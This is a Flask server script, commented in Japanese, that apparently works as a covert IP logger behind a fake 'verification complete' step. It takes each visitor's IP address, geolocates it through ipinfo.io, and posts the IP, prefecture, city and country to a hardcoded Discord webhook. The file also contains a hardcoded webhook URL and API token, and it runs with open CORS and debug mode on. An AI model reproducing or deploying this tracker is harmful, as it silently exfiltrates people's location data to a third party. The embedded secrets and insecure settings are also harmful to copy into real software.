from flask import Flask, jsonify, request
import requests
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # CORSを有効にする

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1352149625905352776/kHe96xlEGu9WbbhNy1yUDrRFjt9m0C7aEkVyUzS2arCOXuEh2QhJ9ZAkQ10OgmY_f6dY"  # DiscordのWebhook URLをここに設定

@app.route('/get-ip', methods=['GET'])
def get_ip():
    # X-Forwarded-For ヘッダーで実際のクライアントIPを取得
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # ipinfo.io APIを使用してIPから地域情報を取得
    access_token = "232da865392bdd"  # ipinfo.ioのアクセス用トークンをここに設定
    response = requests.get(f"http://ipinfo.io/{user_ip}/json?token={access_token}")
    
    if response.status_code == 200:
        data = response.json()
        # regionを都道府県として取得（例: 東京都）
        region = data.get("region", "都道府県情報は取得できませんでした")
        # cityとcountryを追加で取得
        city = data.get("city", "市区町村情報は取得できませんでした")
        country = data.get("country", "国情報は取得できませんでした")

        # Discordにメッセージを送信
        discord_message = {
            "content": f"認証が完了しました！\nIPアドレス: {user_ip}\n地域（都道府県）: {region}\n市区町村: {city}\n国: {country}"
        }

        discord_response = requests.post(DISCORD_WEBHOOK_URL, json=discord_message)
        
        if discord_response.status_code == 204:
            print("Discordにメッセージが正常に送信されました。")
        else:
            print(f"Discordへの送信に失敗しました: {discord_response.status_code}")
        
        return jsonify({"ip": user_ip, "region": region, "city": city, "country": country})
    else:
        return jsonify({"error": "IP情報の取得に失敗しました"}), 500

if __name__ == '__main__':
    app.run(debug=True)
